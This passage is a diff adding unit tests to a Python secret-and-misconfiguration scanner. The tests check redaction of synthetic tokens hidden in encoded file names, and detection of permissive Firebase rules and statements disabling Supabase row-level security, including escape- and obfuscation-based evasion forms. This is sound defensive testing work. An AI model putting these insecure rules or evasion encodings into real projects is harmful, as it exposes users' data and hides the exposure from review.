@@ -6,6 +6,7 @@ import importlib.util
 import json
 import os
 from pathlib import Path
+import random
 import shutil
 import subprocess
 import sys
@@ -15,7 +16,7 @@ import types
 import unicodedata
 import unittest
 from unittest import mock
-from urllib.parse import unquote
+from urllib.parse import quote, unquote
 
 
 REPOSITORY_ROOT = Path(__file__).resolve().parents[1]
@@ -373,6 +374,271 @@ class PreflightTests(unittest.TestCase):
                 self.assertNotIn(decomposed, completed.stdout)
                 self.assertIn("REDACTED", completed.stdout)
 
+    def test_req_007_percent_encoded_secret_path_is_redacted_in_every_format(self) -> None:
+        fixture = RepositoryFixture(self)
+        synthetic_value = "Synthetic/Secret:Value@987654321"
+        assignment_name = "pass" + "word"
+        encoded_name = "Synthetic%2FSecret%3AValue%40987654321.txt"
+        double_encoded_name = encoded_name.replace("%", "%25")
+        fixture.write("config.env", f'{assignment_name}="{synthetic_value}"\n')
+        fixture.write(encoded_name, synthetic_cloud_key() + "\n")
+        fixture.write(double_encoded_name, synthetic_cloud_key() + "\n")
+
+        for output_format in ("text", "json", "sarif"):
+            with self.subTest(output_format=output_format):
+                completed = self.run_scanner(fixture.root, output_format)
+                decoded_once = unquote(completed.stdout)
+                decoded_twice = unquote(decoded_once)
+                self.assertEqual(1, completed.returncode)
+                self.assertNotIn(synthetic_value, completed.stdout)
+                self.assertNotIn(synthetic_value, decoded_once)
+                self.assertNotIn(synthetic_value, decoded_twice)
+                self.assertIn("REDACTED", completed.stdout)
+
+    def test_req_007_loose_provider_token_is_redacted_from_encoded_paths(self) -> None:
+        fixture = RepositoryFixture(self)
+        synthetic_value = "ghp_" + ("A" * 36)
+        encoded_name = synthetic_value.replace("_", "%5F")
+        fixture.write("evidence.txt", synthetic_value + "\n")
+        fixture.write(encoded_name, synthetic_cloud_key() + "\n")
+        fixture.write(encoded_name.replace("%", "%25"), synthetic_cloud_key() + "\n")
+
+        for output_format in ("text", "json", "sarif"):
+            with self.subTest(output_format=output_format):
+                completed = self.run_scanner(fixture.root, output_format)
+                decoded = completed.stdout
+                for _round in range(3):
+                    self.assertNotIn(synthetic_value, decoded)
+                    decoded = unquote(decoded)
+                self.assertEqual(1, completed.returncode)
+                self.assertIn("REDACTED", completed.stdout)
+
+    def test_req_007_source_escapes_and_path_only_tokens_are_redacted(self) -> None:
+        synthetic_value = "ghp_" + ("A" * 36)
+        encoded_value = synthetic_value.replace("_", "%5F")
+        escaped_values = (
+            synthetic_value.replace("_", r"\u005f"),
+            synthetic_value.replace("_", r"\uuuu005f"),
+            synthetic_value.replace("_", r"\137"),
+            synthetic_value.replace("_", r"\N{LOW LINE}"),
+        )
+        for escaped_value in escaped_values:
+            with self.subTest(escaped_value=escaped_value):
+                fixture = RepositoryFixture(self)
+                fixture.write("config.py", f'token="{escaped_value}"\n')
+                fixture.write(encoded_value, synthetic_cloud_key() + "\n")
+                for output_format in ("text", "json", "sarif"):
+                    completed = self.run_scanner(fixture.root, output_format)
+                    decoded = completed.stdout
+                    for _round in range(3):
+                        self.assertNotIn(synthetic_value, decoded)
+                        decoded = unquote(decoded)
+                    self.assertEqual(1, completed.returncode)
+                    self.assertIn("REDACTED", completed.stdout)
+
+        fixture = RepositoryFixture(self)
+        fixture.write(f"{encoded_value}/package.json", "{invalid json\n")
+        for output_format in ("text", "json", "sarif"):
+            with self.subTest(path_only_format=output_format):
+                completed = self.run_scanner(fixture.root, output_format)
+                decoded = completed.stdout
+                for _round in range(3):
+                    self.assertNotIn(synthetic_value, decoded)
+                    decoded = unquote(decoded)
+                self.assertEqual(1, completed.returncode)
+                self.assertIn("REDACTED", completed.stdout)
+
+    def test_req_007_renderer_source_escape_closure_cannot_recreate_secret(self) -> None:
+        scanner = load_scanner_module()
+        fixture = RepositoryFixture(self)
+        synthetic_value = "ghp_" + ("A" * 36)
+        source_escaped_name = synthetic_value.replace("_", r"\u005f")
+        fixture.write("config.env", f'password="{synthetic_value}"\n')
+        fixture.write(source_escaped_name, synthetic_cloud_key() + "\n")
+
+        for output_format in ("text", "json", "sarif"):
+            with self.subTest(output_format=output_format):
+                completed = self.run_scanner(fixture.root, output_format)
+                self.assertEqual(1, completed.returncode)
+                frontier = {completed.stdout}
+                for _round in range(4):
+                    next_frontier: set[str] = set()
+                    for projection in frontier:
+                        normalized = unicodedata.normalize("NFC", projection)
+                        self.assertNotIn(synthetic_value, normalized)
+                        next_frontier.add(unquote(projection))
+                        decoded, _changed = scanner._source_escape_decode_once(projection)
+                        next_frontier.add(decoded)
+                    frontier = next_frontier
+                self.assertIn("REDACTED", completed.stdout)
+
+        near_miss = "ghq" + r"\u005f" + ("A" * 36)
+        candidate = scanner.Candidate(
+            Path("unused"),
+            scanner._safe_display_component(near_miss),
+            None,
+        )
+        redacted = scanner._redact_content_values_from_paths(
+            [candidate],
+            [synthetic_value],
+        )
+        self.assertNotEqual("[REDACTED-PATH]", redacted[0].display_path)
+
+    def test_req_007_source_escape_closure_enforces_four_source_layers(self) -> None:
+        scanner = load_scanner_module()
+        synthetic_value = "ghp_" + ("A" * 36)
+
+        def encoded_display(layer_count: int) -> str:
+            encoded = synthetic_value.replace("_", r"\u005f")
+            for _layer in range(layer_count - 1):
+                encoded = encoded.replace("\\", r"\\")
+            return scanner._safe_display_component(encoded)
+
+        bounded_views, _invalid_utf8, bounded_exceeded = (
+            scanner._path_projection_closure(encoded_display(4))
+        )
+        self.assertFalse(bounded_exceeded)
+        self.assertIn(synthetic_value, bounded_views)
+
+        _views, _invalid_utf8, excessive = scanner._path_projection_closure(
+            encoded_display(5)
+        )
+        self.assertTrue(excessive)
+
+    def test_req_007_unrelated_invalid_percent_utf8_does_not_fail_closed(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write("%FF-unrelated.txt", synthetic_cloud_key() + "\n")
+
+        for output_format in ("text", "json", "sarif"):
+            with self.subTest(output_format=output_format):
+                completed = self.run_scanner(fixture.root, output_format)
+                self.assertEqual(1, completed.returncode)
+                self.assertNotIn("path-redaction-limit", completed.stdout)
+
+    def test_req_007_renderer_encoding_cannot_recreate_a_detected_value(self) -> None:
+        fixture = RepositoryFixture(self)
+        synthetic_value = "Synthetic%20PathCredential123"
+        assignment_name = "pass" + "word"
+        fixture.write("config.env", f'{assignment_name}="{synthetic_value}"\n')
+        fixture.write("Synthetic PathCredential123", synthetic_cloud_key() + "\n")
+
+        for output_format in ("text", "json", "sarif"):
+            with self.subTest(output_format=output_format):
+                completed = self.run_scanner(fixture.root, output_format)
+                decoded = completed.stdout
+                for _round in range(6):
+                    self.assertNotIn(synthetic_value, unicodedata.normalize("NFC", decoded))
+                    decoded = unquote(decoded)
+                self.assertEqual(1, completed.returncode)
+                self.assertIn("REDACTED", completed.stdout)
+
+    def test_req_007_ascii_and_json_escaping_cannot_recreate_a_detected_value(self) -> None:
+        fixture = RepositoryFixture(self)
+        synthetic_value = "\\u0100CredentialPath12345"
+        assignment_name = "pass" + "word"
+        fixture.write("config.env", f'{assignment_name}="{synthetic_value}"\n')
+        fixture.write("ĀCredentialPath12345", synthetic_cloud_key() + "\n")
+
+        for output_format in ("text", "json", "sarif"):
+            with self.subTest(output_format=output_format):
+                completed = self.run_scanner(fixture.root, output_format)
+                self.assertEqual(1, completed.returncode)
+                self.assertNotIn(synthetic_value, completed.stdout)
+                self.assertIn("REDACTED", completed.stdout)
+
+    def test_req_007_percent_encoding_beyond_bound_fails_without_locations(self) -> None:
+        fixture = RepositoryFixture(self)
+        synthetic_value = "Layered/SecretCredential123456789"
+        assignment_name = "pass" + "word"
+        encoded_name = quote(synthetic_value, safe="")
+        for _round in range(4):
+            encoded_name = quote(encoded_name, safe="")
+        fixture.write("config.env", f'{assignment_name}="{synthetic_value}"\n')
+        fixture.write(encoded_name, synthetic_cloud_key() + "\n")
+
+        for output_format in ("text", "json", "sarif"):
+            with self.subTest(output_format=output_format):
+                completed = self.run_scanner(fixture.root, output_format)
+                self.assertEqual(2, completed.returncode)
+                self.assertNotIn(synthetic_value, completed.stdout)
+                self.assertNotIn(encoded_name, completed.stdout)
+                self.assertIn("path-redaction-limit", completed.stdout)
+                if output_format == "json":
+                    document = json.loads(completed.stdout)
+                    self.assertEqual([], document["findings"])
+                elif output_format == "sarif":
+                    document = json.loads(completed.stdout)
+                    self.assertEqual([], document["runs"][0]["results"])
+
+    def test_req_007_invalid_percent_utf8_fails_before_decoder_replacement_leaks(self) -> None:
+        fixture = RepositoryFixture(self)
+        synthetic_value = "�CredentialPath12345"
+        assignment_name = "pass" + "word"
+        fixture.write("config.env", f'{assignment_name}="{synthetic_value}"\n')
+        fixture.write("%FFCredentialPath12345", synthetic_cloud_key() + "\n")
+
+        for output_format in ("text", "json", "sarif"):
+            with self.subTest(output_format=output_format):
+                completed = self.run_scanner(fixture.root, output_format)
+                decoded = completed.stdout
+                for _round in range(3):
+                    self.assertNotIn(synthetic_value, decoded)
+                    decoded = unquote(decoded)
+                self.assertEqual(2, completed.returncode)
+                self.assertIn("path-redaction-limit", completed.stdout)
+
+    def test_req_007_raw_values_are_not_deduplicated_by_sanitized_marker(self) -> None:
+        scanner = load_scanner_module()
+        first = "AKIA" + ("A" * 16)
+        second = "AKIA" + ("B" * 16)
+        self.assertEqual(
+            scanner._safe_display_component(first),
+            scanner._safe_display_component(second),
+        )
+        candidates = [
+            scanner.Candidate(Path("unused-a"), f"artifact-{first}", None),
+            scanner.Candidate(Path("unused-b"), f"artifact-{second}", None),
+        ]
+
+        redacted = scanner._redact_content_values_from_paths(candidates, [first, second])
+
+        self.assertEqual(2, len(redacted))
+        self.assertTrue(all("REDACTED" in item.display_path for item in redacted))
+        self.assertTrue(all(first not in item.display_path for item in redacted))
+        self.assertTrue(all(second not in item.display_path for item in redacted))
+
+    def test_req_007_percent_closure_handles_utf8_case_and_four_layers(self) -> None:
+        scanner = load_scanner_module()
+        synthetic_value = "é/layeredcredential12345"
+        decomposed = unicodedata.normalize("NFD", synthetic_value)
+        candidates = []
+        for rounds in (1, 2, 4):
+            encoded = decomposed
+            for _round in range(rounds):
+                encoded = quote(encoded, safe="").lower()
+            candidates.append(
+                scanner.Candidate(
+                    Path(f"unused-{rounds}"),
+                    f"prefix-{encoded}-%g0-suffix",
+                    None,
+                )
+            )
+
+        redacted = scanner._redact_content_values_from_paths(
+            candidates,
+            [synthetic_value],
+        )
+
+        self.assertEqual(3, len(redacted))
+        for candidate in redacted:
+            decoded = candidate.display_path
+            for _round in range(6):
+                self.assertNotIn(
+                    synthetic_value,
+                    unicodedata.normalize("NFC", decoded),
+                )
+                decoded = unquote(decoded)
+
     def test_req_007_path_format_controls_are_escaped_in_every_format(self) -> None:
         fixture = RepositoryFixture(self)
         format_control = "\u202e"
@@ -635,6 +901,70 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual([1, 2, 3], [item["line"] for item in findings if item["path"] == "firestore.rules"])
         self.assertEqual(1, len([item for item in findings if item["path"] == "database.rules.json"]))
 
+    def test_req_008_parenthesized_and_escaped_literal_tautologies_block(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "firestore.rules",
+            "allow read: if (true) == (true);\n"
+            "allow write: if (1) == (1);\n"
+            'allow create: if ("open") == ("open");\n'
+            'allow update: if "open" == "\\u006fpen";\n'
+            'allow get: if ("a==b") == ("a==b");\n'
+            'allow delete: if "open" == "\\u0063losed";\n',
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual([1, 2, 3, 4, 5], [finding["line"] for finding in findings])
+
+    def test_req_008_parenthesized_tautologies_adjacent_to_or_block(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "firestore.rules",
+            "allow read: if request.auth != null || (1) == (1);\n"
+            'allow write: if request.auth != null || (("x")) == (("x"));\n'
+            "allow delete: if request.auth != null || (1) == (2);\n",
+        )
+        fixture.write(
+            "database.rules.json",
+            '{"rules":{"items":{".read":"auth != null || (1) == (1)"}}}\n',
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual(
+            {("database.rules.json", 1), ("firestore.rules", 1), ("firestore.rules", 2)},
+            {(finding["path"], finding["line"]) for finding in findings},
+        )
+
+    def test_req_008_redacted_rule_filename_retains_internal_classification(self) -> None:
+        fixture = RepositoryFixture(self)
+        synthetic_value = synthetic_firebase_key()
+        assignment_name = "firebase" + "ApiKey"
+        fixture.write(
+            "config.js",
+            f'const {assignment_name} = "{synthetic_value}";\n',
+        )
+        fixture.write(
+            f"{synthetic_value}.rules",
+            "allow read: if true;\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        rule_ids = {finding["rule_id"] for finding in report["findings"]}
+        self.assertEqual(1, completed.returncode)
+        self.assertIn("VW-FIREBASE-PERMISSIVE-RULE", rule_ids)
+        self.assertNotIn(synthetic_value, completed.stdout)
+
     def test_req_008_literal_tautologies_inside_or_conditions_block(self) -> None:
         fixture = RepositoryFixture(self)
         fixture.write(
@@ -808,6 +1138,330 @@ class PreflightTests(unittest.TestCase):
         )
         self.assertEqual([], failed_findings)
 
+    def test_req_008_firebase_constant_evaluator_covers_bounded_literal_forms(self) -> None:
+        fixture = RepositoryFixture(self)
+        long_literal = "x" * 257
+        fixture.write(
+            "firestore.rules",
+            "allow read: if 1 != 2;\n"
+            "allow write: if 1 < 2;\n"
+            "allow create: if !(!true);\n"
+            f"allow update: if {'!' * 34}true;\n"
+            f'allow get: if "{long_literal}" == "{long_literal}";\n'
+            "allow delete: if 1 != 1;\n"
+            "allow list: if 2 < 1;\n"
+            "allow read: if !true;\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual([1, 2, 3, 4, 5], [item["line"] for item in findings])
+
+    def test_req_008_firebase_constant_list_membership_is_exact_and_opaque(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "firestore.rules",
+            "allow read: if 1 in [1];\n"
+            "allow write: if 'a' in ['a'];\n"
+            "allow create: if null in [false, null, true];\n"
+            "allow update: if 1 in [2];\n"
+            "allow get: if 1 in [];\n"
+            "allow list: if request.auth.uid in ['a'];\n"
+            "allow delete: if 1 in [request.auth.uid];\n"
+            "allow read: if 1 in [1, request.auth.uid];\n"
+            "allow write: if 1 in dynamicList;\n"
+            "allow create: if [1] in [[1]];\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual([1, 2, 3], [item["line"] for item in findings])
+
+        scanner = load_scanner_module()
+        cases = {
+            "1 in [1]": True,
+            "'a' /* item */ in /* list */ ['a']": True,
+            "1 in [2]": False,
+            "1 in []": False,
+            "request.auth.uid in ['a']": None,
+            "1 in [request.auth.uid]": None,
+            "1 in [1, request.auth.uid]": None,
+            "1 in dynamicList": None,
+            "[1] in [[1]]": None,
+            "1 inside [1]": None,
+        }
+        for expression, expected in cases.items():
+            with self.subTest(expression=expression):
+                self.assertIs(expected, scanner._firebase_condition_value(expression))
+
+    def test_req_008_firebase_constant_list_membership_is_linear_and_bounded(self) -> None:
+        scanner = load_scanner_module()
+        literal_list = ",".join(str(value) for value in range(20_000))
+        expressions = (
+            (f"19999 in [{literal_list}]", None),
+            (f"-1 in [{literal_list}]", None),
+            (f"1 in [{literal_list}, request.auth.uid]", None),
+        )
+
+        started = time.perf_counter()
+        for expression, expected in expressions:
+            self.assertIs(expected, scanner._firebase_condition_value(expression))
+        elapsed = time.perf_counter() - started
+
+        self.assertLess(elapsed, 2.0, f"Firebase membership scan took {elapsed:.3f}s")
+
+    def test_req_008_firebase_boolean_precedence_and_tristate_are_exact(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "firestore.rules",
+            "allow read: if true && true;\n"
+            "allow write: if !(true && false);\n"
+            "allow create: if false || true && true;\n"
+            "allow update: if request.auth != null || true;\n"
+            "allow get: if true || false && false;\n"
+            "allow list: if false && (true || false);\n"
+            "allow delete: if (true || false) && false;\n"
+            "allow read: if !(true || false);\n"
+            "allow write: if request.auth != null && true;\n"
+            "allow create: if false || request.auth != null;\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual([1, 2, 3, 4, 5], [item["line"] for item in findings])
+
+    def test_req_008_unconditional_arithmetic_and_ternary_rules_block(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "firestore.rules",
+            "allow read;\n"
+            "allow read, write;\n"
+            "allow create: if 1 + 1 == 2;\n"
+            "allow update: if 2 * 3 == 6 && 7 % 4 == 3;\n"
+            "allow delete: if true == 1 < 2;\n"
+            "allow get: if false ? false : true;\n"
+            "allow list: if true ? false : true;\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual([1, 2, 3, 4, 5, 6], [item["line"] for item in findings])
+
+        scanner = load_scanner_module()
+        cases = {
+            "8 / 4 == 2": True,
+            "-(1 + 1) == -2": True,
+            "+2 * 3 == 6": True,
+            "-7 % 4 == -3": True,
+            "-7 % 4 == 1": False,
+            "false ? false : true ? true : false": True,
+            "true ? false : true": False,
+            "1 / 0 == 1": None,
+            "request.auth != null ? true : true": True,
+        }
+        for expression, expected in cases.items():
+            with self.subTest(expression=expression):
+                self.assertIs(expected, scanner._firebase_condition_value(expression))
+
+    def test_req_008_rtdb_strict_operators_and_inner_strings_are_exact(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "database.strict.rules.json",
+            "{\n"
+            '  "rules": {\n'
+            '    ".read": "1 === 1",\n'
+            '    ".write": "1 !== 2"\n'
+            "  }\n"
+            "}\n",
+        )
+        fixture.write(
+            "database.safe.rules.json",
+            json.dumps(
+                {
+                    "rules": {
+                        ".read": "data.val() == 'x || true'",
+                        ".write": "data.val() == 'true || x'",
+                        "safe-comment": {
+                            ".read": "auth != null /* || true */",
+                        },
+                    }
+                },
+                indent=2,
+            ),
+        )
+        fixture.write(
+            "database.comment.rules.json",
+            '{"rules":{".read":"auth != null /* explanation */ || true"}}\n',
+        )
+        fixture.write(
+            "database.strict-escaped.rules.json",
+            '{"rules":{"\\u002eread":"\\u0031 \\u003d\\u003d\\u003d 1"}}\n',
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual(
+            [
+                ("database.comment.rules.json", 1),
+                ("database.strict-escaped.rules.json", 1),
+                ("database.strict.rules.json", 3),
+                ("database.strict.rules.json", 4),
+            ],
+            [(item["path"], item["line"]) for item in findings],
+        )
+
+    def test_req_008_firebase_boolean_evaluator_matches_deterministic_fuzz(self) -> None:
+        scanner = load_scanner_module()
+        generator = random.Random(0x51A7E)
+        leaves: tuple[tuple[str, bool | None], ...] = (
+            ("true", True),
+            ("false", False),
+            ("1 == 1", True),
+            ("1 === 2", False),
+            ("1 !== 2", True),
+            ('"x" == "x"', True),
+            ("request.auth != null", None),
+            ("data.val() == 'x || true'", None),
+        )
+
+        def negate(value: bool | None) -> bool | None:
+            return None if value is None else not value
+
+        def conjunction(left: bool | None, right: bool | None) -> bool | None:
+            if left is False or right is False:
+                return False
+            if left is True and right is True:
+                return True
+            return None
+
+        def disjunction(left: bool | None, right: bool | None) -> bool | None:
+            if left is True or right is True:
+                return True
+            if left is False and right is False:
+                return False
+            return None
+
+        def atom(depth: int) -> tuple[str, bool | None]:
+            if depth <= 0 or generator.randrange(4) == 0:
+                return leaves[generator.randrange(len(leaves))]
+            if generator.randrange(2) == 0:
+                expression, value = atom(depth - 1)
+                return f"!({expression})", negate(value)
+            expression, value = boolean_expression(depth - 1)
+            return f"({expression})", value
+
+        def and_expression(depth: int) -> tuple[str, bool | None]:
+            expression, value = atom(depth)
+            for _ in range(generator.randrange(3)):
+                right_expression, right_value = atom(depth)
+                expression += f" && {right_expression}"
+                value = conjunction(value, right_value)
+            return expression, value
+
+        def boolean_expression(depth: int) -> tuple[str, bool | None]:
+            expression, value = and_expression(depth)
+            for _ in range(generator.randrange(3)):
+                right_expression, right_value = and_expression(depth)
+                expression += f" || {right_expression}"
+                value = disjunction(value, right_value)
+            return expression, value
+
+        for case_index in range(512):
+            expression, expected = boolean_expression(4)
+            with self.subTest(case=case_index, expression=expression):
+                self.assertIs(expected, scanner._firebase_condition_value(expression))
+
+    def test_req_008_firebase_boolean_evaluator_is_iterative_and_bounded(self) -> None:
+        scanner = load_scanner_module()
+        cases = (
+            (("!" * 200_000) + "true", True),
+            (" || ".join(["true"] * 20_000), True),
+            (" && ".join(["request.auth != null"] * 20_000), None),
+        )
+
+        started = time.perf_counter()
+        for expression, expected in cases:
+            self.assertIs(expected, scanner._firebase_condition_value(expression))
+        elapsed = time.perf_counter() - started
+
+        self.assertLess(elapsed, 2.0, f"bounded Firebase evaluation took {elapsed:.3f}s")
+
+    def test_req_008_firebase_preserves_whitespace_inside_string_literals(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "firestore.rules",
+            'allow read: if "a  b" == "a b";\n'
+            'allow write: if "a  b" == "a  b";\n'
+            'allow create: if "a\tb" == "a b";\n',
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual([2], [item["line"] for item in findings])
+
+    def test_req_008_rtdb_json_escapes_cannot_hide_permissive_rules(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "database.rules.json",
+            '{"rules":{"\\u002eread":true}}\n',
+        )
+        fixture.write(
+            "database.value.rules.json",
+            '{"rules":{".read":"\\u0074rue"}}\n',
+        )
+        fixture.write(
+            "database.condition.rules.json",
+            '{"rules":{".\\u0072ead":"auth != null || \\u0074rue"}}\n',
+        )
+        fixture.write(
+            "database.quoted.rules.json",
+            '{"rules":{".read":"\\\"x\\\" == \\\"x\\\""}}\n',
+        )
+        fixture.write(
+            "database.safe.rules.json",
+            '{"rules":{"\\u002eread":"\\u0066alse"}}\n',
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual(
+            {
+                "database.condition.rules.json",
+                "database.quoted.rules.json",
+                "database.rules.json",
+                "database.value.rules.json",
+            },
+            {item["path"] for item in findings},
+        )
+
     def test_req_008_explicitly_disabled_supabase_rls_blocks(self) -> None:
         fixture = RepositoryFixture(self)
         fixture.write(
@@ -824,6 +1478,24 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual(1, len(rls_findings))
         self.assertEqual("supabase/migrations/001_access.sql", rls_findings[0]["path"])
         self.assertEqual(1, rls_findings[0]["line"])
+
+    def test_req_008_supabase_rls_supports_unicode_and_quoted_identifiers(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "schema.sql",
+            "ALTER TABLE público.contas_ação DISABLE ROW LEVEL SECURITY;\n"
+            "ALTER TABLE 数据.客户 * DISABLE ROW LEVEL SECURITY;\n"
+            'ALTER TABLE "linha\nquebrada"."tabela" DISABLE ROW LEVEL SECURITY;\n'
+            "ALTER TABLE 1inválida DISABLE ROW LEVEL SECURITY;\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
+        ]
+        self.assertEqual([1, 2, 3], [item["line"] for item in findings])
 
     def test_req_008_supabase_rls_line_mapping_is_linear(self) -> None:
         scanner = load_scanner_module()
@@ -866,7 +1538,356 @@ class PreflightTests(unittest.TestCase):
 
         report = self.json_report(self.run_scanner(fixture.root))
         findings = [item for item in report["findings"] if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"]
-        self.assertEqual([5], [item["line"] for item in findings])
+        self.assertEqual([3, 5, 6], [item["line"] for item in findings])
+
+    def test_req_008_postgres_executable_and_escaped_forms_are_classified(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "blocked.sql",
+            "SELECT E'escaped \\\' quote'; ALTER TABLE accounts DISABLE ROW LEVEL SECURITY;\n"
+            "ALTER TABLE accounts ADD COLUMN note text, DISABLE ROW LEVEL SECURITY;\n"
+            "ALTER TABLE accounts ENABLE TRIGGER ALL, DISABLE ROW LEVEL SECURITY;\n"
+            'ALTER TABLE U&"d\\0061ta" DISABLE ROW LEVEL SECURITY;\n'
+            "ALTER TABLE 😀 DISABLE ROW LEVEL SECURITY;\n"
+            "ALTER TABLE a\u0338 DISABLE ROW LEVEL SECURITY;\n"
+            'ALTER TABLE U&"d!0061ta" UESCAPE \'!\' DISABLE ROW LEVEL SECURITY;\n'
+            "DO $body$\nBEGIN\n"
+            "  ALTER TABLE nested_accounts DISABLE ROW LEVEL SECURITY;\n"
+            "END\n$body$;\n",
+        )
+        fixture.write(
+            "safe.sql",
+            "SELECT E'escaped \\\' ALTER TABLE fake DISABLE ROW LEVEL SECURITY';\n"
+            "SELECT $$ ALTER TABLE fake DISABLE ROW LEVEL SECURITY; $$;\n"
+            "COPY audit_log FROM stdin;\n"
+            "ALTER TABLE copied_text DISABLE ROW LEVEL SECURITY;\n"
+            "\\.\n"
+            "SELECT copy FROM stdin;\n"
+            'ALTER TABLE U&"data" UESCAPE !! DISABLE ROW LEVEL SECURITY;\n',
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
+        ]
+        self.assertEqual({"blocked.sql"}, {item["path"] for item in findings})
+        self.assertEqual([1, 2, 3, 4, 5, 6, 7, 10], [item["line"] for item in findings])
+
+    def test_req_008_postgres_dynamic_and_routine_bodies_are_executable(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "executable.sql",
+            "DO $$ BEGIN EXECUTE 'ALTER TABLE dynamic_text DISABLE ROW LEVEL SECURITY'; END $$;\n"
+            "DO $outer$ BEGIN EXECUTE $ddl$ALTER TABLE dynamic_dollar DISABLE ROW LEVEL SECURITY;$ddl$; END $outer$;\n"
+            'DO LANGUAGE "plpgsql" $body$ BEGIN ALTER TABLE quoted_language DISABLE ROW LEVEL SECURITY; END $body$;\n'
+            'DO LANGUAGE U&"plpgsql" $body$ BEGIN ALTER TABLE unicode_language DISABLE ROW LEVEL SECURITY; END $body$;\n'
+            "CREATE FUNCTION change_access() RETURNS void LANGUAGE plpgsql AS $fn$ BEGIN EXECUTE 'ALTER TABLE function_table DISABLE ROW LEVEL SECURITY'; END $fn$;\n"
+            "CREATE PROCEDURE change_more_access() LANGUAGE plpgsql AS $proc$ BEGIN ALTER TABLE procedure_table DISABLE ROW LEVEL SECURITY; END $proc$;\n"
+            "DO $😀$ BEGIN ALTER TABLE highbit_tag DISABLE ROW LEVEL SECURITY; END $😀$;\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
+        ]
+        self.assertEqual([1, 2, 3, 4, 5, 6, 7], [item["line"] for item in findings])
+
+    def test_req_008_postgres_constant_execute_literals_are_decoded(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "constant-execute.sql",
+            r"DO $$ BEGIN EXECUTE E'ALTER\x20TABLE hex_table DISABLE ROW LEVEL SECURITY'; END $$;" "\n"
+            r"DO $$ BEGIN EXECUTE E'ALTER\040TABLE octal_table DISABLE ROW LEVEL SECURITY'; END $$;" "\n"
+            r"DO $$ BEGIN EXECUTE E'ALTER\u0020TABLE unicode_e_table DISABLE ROW LEVEL SECURITY'; END $$;" "\n"
+            r"DO $$ BEGIN EXECUTE U&'ALTER\0020TABLE unicode_table DISABLE ROW LEVEL SECURITY'; END $$;" "\n"
+            r"DO $$ BEGIN EXECUTE U&'ALTER!0020TABLE custom_escape DISABLE ROW LEVEL SECURITY' UESCAPE '!'; END $$;" "\n"
+            "DO $$ BEGIN EXECUTE 'ALTER ' || 'TABLE concatenated DISABLE ROW LEVEL SECURITY'; END $$;\n"
+            r"DO $$ BEGIN EXECUTE E'AL\x54ER' /* join */ || U&'\0020TABLE ' || $ddl$mixed DISABLE ROW LEVEL SECURITY$ddl$; END $$;" "\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
+        ]
+        self.assertEqual([1, 2, 3, 4, 5, 6, 7], [item["line"] for item in findings])
+
+    def test_req_008_postgres_constant_execute_compositions_are_decoded(self) -> None:
+        fixture = RepositoryFixture(self)
+        maximum_grouping = 64
+        constant_sql = "'ALTER TABLE bounded DISABLE ROW LEVEL SECURITY'"
+        positive_sources = {
+            "grouped.sql": (
+                "DO $$ BEGIN EXECUTE "
